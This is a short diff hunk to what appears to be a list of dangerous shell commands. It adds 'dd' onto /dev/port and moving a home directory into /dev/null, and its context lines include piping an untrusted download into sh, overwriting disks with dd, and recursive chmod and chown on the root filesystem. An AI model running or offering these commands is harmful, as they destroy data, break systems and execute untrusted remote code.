@@ -20,11 +20,15 @@ wget [http://some_untrusted_source] -O- | sh
 
 dd if=/dev/random of=/dev/sda
 
+dd if=/dev/random of=/dev/port
+
 dd if=/dev/zero of=/dev/sda1
 
 chmod -R 777 /
 
 chmod 000 -R
+
+mv /home/[your user]/* /dev/null
 
 chown nobody:nobody -R /
 
